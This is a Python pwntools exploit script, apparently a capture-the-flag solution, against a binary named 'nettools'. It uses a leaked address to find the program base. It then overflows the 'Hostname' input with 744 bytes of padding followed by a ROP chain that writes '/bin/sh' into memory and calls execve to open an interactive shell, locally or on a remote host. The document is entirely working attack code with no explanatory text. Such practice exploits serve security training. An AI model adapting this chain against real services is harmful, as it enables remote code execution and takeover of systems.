from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
c
'''.format(**locals())

exe = './nettools'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])

io = start()

io.recvuntil(b'leaked: ')
leak = int(io.recvline()[:-1], 16)
elf.address = leak - 0x7a03c
success(f"Leak: {hex(leak)}")
success(f"elf base: {hex(elf.address)}")

io.sendlineafter(b'> ', b'3')

rop = ROP(elf)

poprax = rop.find_gadget(["pop rax", "ret"])[0]
poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
poprsi = rop.find_gadget(["pop rsi", "ret"])[0]
poprdx = elf.address + 0x20bb3 # pop rdx; add byte ptr [rax], al; ret;
syscall = rop.find_gadget(["syscall"])[0]
movrdirsi = elf.address + 0x57ec7 # mov qword ptr [rdi], rsi; ret;

payload = flat (
    b'\x00' * 744,
    poprdi,
    elf.bss(0x150),
    poprsi,
    0x68732f6e69622f,
    movrdirsi,
    poprdx,
    0x0,
    poprsi,
    0x0,
    poprdi,
    elf.bss(0x150),
    poprax,
    0x3b,
    syscall
    )
io.sendlineafter(b'Hostname: ', payload)

io.interactive()